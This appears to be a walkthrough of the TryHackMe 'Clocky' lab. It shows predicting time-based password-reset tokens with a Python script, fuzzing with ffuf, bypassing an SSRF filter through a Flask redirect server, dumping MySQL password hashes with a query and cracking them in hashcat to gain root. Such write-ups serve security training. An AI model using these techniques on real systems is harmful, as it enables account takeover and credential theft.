```

There are four ports open.
- 22/SSH
- 80/HTTP
- 8000/HTTP
- 8080/HTTP

## Flag 1

We can get our first flag by visiting `http://clocky.thm:8000/robots.txt` 

![Web 8000 robots.txt](/assets/images/TryHackMe-Clocky/web_8000_robots_txt.png)

## Flag 2

Run dirsearch to find `/index.zip`.
```console
$ dirsearch -u http://clocky.thm:8000

  _|. _ _  _  _  _ _|_    v0.4.2

Task Completed
```

After downloading and unzipping the index.zip file, we can get flag2.txt and also app.py.

## Flag 3
After analyzing source code of app.py, we discovered few api endpoints:
- `/`
- `/administrator`
- `/forgot_password`
- `/password_reset`

Here, `/forgot_password` generates reset token just based on current time, so we can crack it.

```python
value = datetime.datetime.now()
lnk = str(value)[:-4] + " . " + username.upper()
lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
```

Now, let's make request for forgot_password as `administrator` username, and we can see in burp suite that we can get Date and time.
![Date and time in response](/assets/images/TryHackMe-Clocky/date_time_in_response.png)

Let's write simple python script to generate tokens:
```python
import requests
import hashlib

for i in range(0,100):

	i = str(i).rjust(2, "0")
	value = '2024-07-10 20:39:18.' + i
	lnk = value + " . " + 'ADMINISTRATOR'
	lnk = hashlib.sha1(lnk.encode("utf-8")).hexdigest()
	print(lnk)
```

Save this tokens into file to fuzz it afterwards.

Now, we have to find the right parameter for the `/password_reset` endpoint because in the source code suggested `TEMPORARY` parameter is giving us the error `Invalid parameter`

```console
$ ffuf -u http://clocky.thm:8080/password_reset?FUZZ=test -w /usr/share/SecLists/Discovery/Web-Content/burp-parameter-names.txt -fs 26

Now, let's fuzz our tokens to find the right one.

```console
$ ffuf -u http://clocky.thm:8080/password_reset?token=FUZZ -w times.txt -fs 22

```

Using the token we have found, we can make request to reset the password for administrator account. And after logging into account we can get our third flag.
![Flag 3](/assets/images/TryHackMe-Clocky/flag_3.png)

## Flag 4

Here, we can give input in Location field and it downloads the file called file.txt. We can try different file names but it seems to only download empty file.

After few attempts, we can discover that there is an SSRF vulnerability, but it is giving us the error that `Action not permitted`. We can try different SSRF payloads, but no luck. It seems there is some kind filter that preventing from listing files.
![SSRf payload fail](/assets/images/TryHackMe-Clocky/ssrf_payload_fail.png)

After some research on portswigger, we can discover that we can bypass this filter by using redirection. So, we can write simple python script to get request on our web server and then redirect it to machine's server to get the `database.sql` file in the following manner:
```python
from flask import Flask, redirect, request
app = Flask(__name__)

@app.route('/', methods=['GET'])
def redirect_me():
	redirect_url = 'http://127.0.0.1/database.sql'
	return redirect(redirect_url, code=302)

if __name__ == '__main__':
	app.run(host='0.0.0.0', port=7777, debug=True)
```

Now, we can just make request to ourself and can get the flag :
![Flag 4](/assets/images/TryHackMe-Clocky/flag_4.png)

## Flag 5

In the output of `database.sql`, we can get password and try it to get `SSH` shell as there is possibility of password reuse. In the `app.py` file, we have got two usernames: `jane` and `clarice`.
After trying password for both the users, we got shell as `clarice` and also get fifth flag in her home directory.

## Flag 6

After running linpeas, we can get mysql database password in `/home/clarice/app/.env` file.
We can login to mysql database with user `clocky_user` (which we got from `app.py`) and password that we just found.

By looking in mysql database and user table, we can see that we have few users with password hashes and we can also see there is one plugin called `caching_sha2_password` is used for authentication. In the User column, there is one interesting user called "dev".
```console
mysql> select User from user;
+------------------+
| User             |
+------------------+
| clocky_user      |
| dev              |
| clocky_user      |
| debian-sys-maint |
| dev              |
| mysql.infoschema |
| mysql.session    |
| mysql.sys        |
| root             |
+------------------+
9 rows in set (0.00 sec)

```

After searching over internet, I found this https://www.percona.com/blog/brute-force-mysql-password-from-a-hash/  blog that shows how we can retrieve hash from `authentication_string`. 
Use blow query to dump hash:
```console
mysql> select CONCAT('$mysql',LEFT(authentication_string,6),'*',INSERT(HEX(SUBSTR(authentication_string,8)),41,0,'*')) AS hash FROM user where User="dev";
+--------------------------------+
| hash                           |
+--------------------------------+
| $mysql$A$005*0D172F7...4536142 |
| $mysql$A$005*1C160A3...935462E |
+--------------------------------+
2 rows in set (0.00 sec)
```

Now, we can crack password with `hashcat` using mode `7401`:
```console
$ hashcat -m 7401 hash /usr/share/wordlists/rockyou.txt
...
$mysql$A$005*1C160A...935462E:[REDACTED]
$mysql$A$005*0D172F...4536142:[REDACTED]
...
```

Use this password to switch to `root` user and get the sixth flag.
```console
clarice@clocky:~$ su root
Password: 
root@clocky:/home/clarice# cat /root/flag6.txt
THM{REDACTED}
```
